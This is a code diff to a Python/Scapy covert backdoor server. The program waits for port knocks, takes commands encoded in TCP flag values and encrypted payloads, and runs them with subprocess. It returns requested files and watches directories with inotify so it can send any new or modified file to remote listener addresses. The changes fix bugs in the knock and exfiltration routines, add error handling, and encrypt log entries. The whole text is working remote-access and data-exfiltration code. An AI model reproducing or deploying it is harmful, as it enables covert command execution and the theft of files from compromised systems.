@@ -107,7 +107,7 @@ def server():
 		if packet.haslayer(TCP):
 			# Check for the reset port first
 			for port in reset:
-				if port == packet[TCP].sport:
+				if port == packet[TCP].dport:
 					for src, word in passCheck:
 						if src == packet[IP].src:
 							passCheck.remove([src, word])
@@ -129,7 +129,7 @@ def server():
 		elif packet.haslayer(UDP):
 			# Check for the reset port first
 			for port in reset:
-				if port == packet[UDP].sport:
+				if port == packet[UDP].dport:
 					for src, word in passCheck:
 						if src == packet[IP].src:
 							passCheck.remove([src, word])
@@ -337,19 +337,19 @@ def commandParser():
 	def getResponse(packet):
 		if packet.haslayer(TCP):
 			# Kill
-			if packet[TCP].flags == 1:
+			if packet[TCP].flags == 1 + 32:
 				sys.exit()
 			# iNotify
-			elif packet[TCP].flags == 14:
+			elif packet[TCP].flags == 18 + 32:
 				notify(packet)
 			# Terminal Command
-			elif packet[TCP].flags == 2:
+			elif packet[TCP].flags == 2 + 32:
 				terminal(packet)
 			# Client receives file
-			elif packet[TCP].flags == 16:
+			elif packet[TCP].flags == 16 + 32:
 				getFile(packet)
 			# Client sends file
-			elif packet[TCP].flags == 0:
+			elif packet[TCP].flags == 0 + 32:
 				sendFile(packet)
 		elif packet.haslayer(UDP):
 			# Kill
@@ -415,7 +415,7 @@ def sendFile(packet):
 				tFile.write(encrypt(dPacket[0][Raw].load))
 	if len(logFile) > 0:
 		with open(logFile, "a") as serverLog:
-			serverLog.write(packet[Raw].load + " received from " + packet[IP].src + " at " + time.ctime() + "\n")
+			serverLog.write(encrypt(packet[Raw].load) + " received from " + packet[IP].src + " at " + time.ctime() + "\n")
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -442,13 +442,19 @@ def getFile(packet):
 		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
 			      TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=random.randint(0, 16777215))/\
 			      Raw(load="")
-		with open(encrypt(packet[Raw].load), "r") as tFile:
-			for line in tFile:
-				time.sleep(0.1)
-				dPacket[IP].id = dPacket[IP].id + 1
-				dPacket[TCP].seq = dPacket[TCP].seq + 1
-				dPacket[Raw].load = encrypt(line)
-				send(dPacket, verbose=0)
+		try:
+			with open(encrypt(packet[Raw].load), "r") as tFile:
+				for line in tFile:
+					time.sleep(0.1)
+					dPacket[IP].id = dPacket[IP].id + 1
+					dPacket[TCP].seq = dPacket[TCP].seq + 1
+					dPacket[Raw].load = encrypt(line)
+					send(dPacket, verbose=0)
+		except IOError:
+			if len(logFile) > 0:
+				with open(logFile, "a") as serverLog:
+					serverLog.write(encrypt(packet[Raw].load) + " does not exist" + "\n")
+
 		dPacket[IP].id = dPacket[IP].id + 1
 		dPacket[TCP].seq = dPacket[TCP].seq + 1
 		dPacket[Raw].load = ""
@@ -458,11 +464,17 @@ def getFile(packet):
 		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
 			      UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)/\
 			      Raw(load="")
-		with open(encrypt(packet[Raw].load), "r") as tFile:
-			for line in tFile:
-				dPacket[IP].id = dPacket[IP].id + 1
-				dPacket[Raw].load = encrypt(line)
-				send(dPacket, verbose=0)
+		try:
+			with open(encrypt(packet[Raw].load), "r") as tFile:
+				for line in tFile:
+					dPacket[IP].id = dPacket[IP].id + 1
+					dPacket[Raw].load = encrypt(line)
+					send(dPacket, verbose=0)
+		except IOError:
+			if len(logFile) > 0:
+				with open(logFile, "a") as serverLog:
+					serverLog.write(encrypt(packet[Raw].load) + " does not exist" + "\n")
+
 		dPacket[IP].id = commandPacket[IP].id + 1
 		dPacket[Raw].load = ""
 		dPacket[UDP].flags="F"
@@ -470,7 +482,7 @@ def getFile(packet):
 
 	if len(logFile) > 0:
 		with open(logFile, "a") as serverLog:
-			serverLog.write(packet[Raw].load + " sent to " + packet[IP].src + " at " + time.ctime() + "\n")
+			serverLog.write(encrypt(packet[Raw].load) + " sent to " + packet[IP].src + " at " + time.ctime() + "\n")
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -493,7 +505,7 @@ def getFile(packet):
 ---------------------------------------------------------------------------------------------
 '''
 def terminal(packet):
-	output = encrypt(subprocess.check_output(packet[Raw].load.split(), stderr=subprocess.STDOUT))
+	output = encrypt(subprocess.check_output(encrypt(packet[Raw].load).split(), stderr=subprocess.STDOUT))
 	if packet.haslayer(TCP):
 		confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
 			            TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)
@@ -527,7 +539,7 @@ def terminal(packet):
 		
 	if len(logFile) > 0:
 		with open(logFile, "a") as serverLog:
-			serverLog.write("Results of \"" + packet[Raw].load + "\" sent to " + packet[IP].src + " at " + time.ctime() + "\n")
+			serverLog.write("Results of \"" + encrypt(packet[Raw].load) + "\" sent to " + packet[IP].src + " at " + time.ctime() + "\n")
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -551,20 +563,24 @@ def terminal(packet):
 '''
 listenerIP = []
 def notify(packet):
-	wdd = watchMan.add_watch(encrypt(packet[Raw].load.split()[0]), pyinotify.IN_CREATE | pyinotify.IN_MODIFY, rec=True)
-	listenerIP.append(encrypt(packet[Raw].load.split()[1]))
+	if len(logFile) > 0:
+		with open(logFile, "a") as serverLog:
+			serverLog.write("Tracking " + encrypt(packet[Raw].load).split()[0] + " for " + packet[IP].src + " at " + time.ctime() + "\n")
+	wdd = watchMan.add_watch(encrypt(packet[Raw].load).split()[0], pyinotify.IN_CREATE | pyinotify.IN_MODIFY, rec=True)
+	address = encrypt(packet[Raw].load).split()[1]
+	if address not in listenerIP:
+		listenerIP.append(address)
 
 class EventHandler(pyinotify.ProcessEvent):
 	def process_IN_CREATE(self, event):
-		sendKnock()
-		sendFile(event)
-	def process_IN_MODIFY(self, event):
-		sendKnock()
-		sendFile(event)
+		if ".goutputstream" in event.pathname:
+			return
+		self.sendKnock()
+		self.sendFile(event)
 	def sendKnock(self):
 		seq = random.randint(0, 16777215)
 		ipid = random.randint(0, 65535)
-		ipHead = IP(ipid)
+		ipHead = IP(id=ipid)
 		knockPacket = ipHead/\
 			          TCP(sport=random.randint(0, 65535), dport=reset[0], seq=seq)
 		send(knockPacket, verbose=0)
@@ -573,14 +589,20 @@ class EventHandler(pyinotify.ProcessEvent):
 			knockPacket[IP].seq += 1
 			knockPacket[TCP].dport = port
 			for address in listenerIP:
-				knocPacket[IP].dst = address
+				knockPacket[IP].dst = address
 				send(knockPacket, verbose=0)
 	def sendFile(self, event):
+		path = event.pathname
+		if "~" in path:
+			path = path.replace('~', '')
 		commandPacket = IP(dst="127.0.0.1", id=random.randint(0, 65535))/\
 				        TCP(sport=random.randint(0, 65535), dport=random.randint(0, 65535), seq=random.randint(0, 16777215), flags="")/\
-				        Raw(load=encrypt(event.pathname.split("/")[len(event.pathname.split("/"))-1]))
-		send(commandPacket, verbose=0)
-		with open(event.pathname, "r") as tFile:
+				        Raw(load=encrypt(path.split("/")[len(event.pathname.split("/"))-1]))
+		for address in listenerIP:
+			commandPacket[IP].dst = address
+			commandPacket[IP].dst = address
+			send(commandPacket, verbose=0)
+		with open(path, "r") as tFile:
 			for line in tFile:
 				time.sleep(0.1)
 				commandPacket[IP].id = commandPacket[IP].id + 1
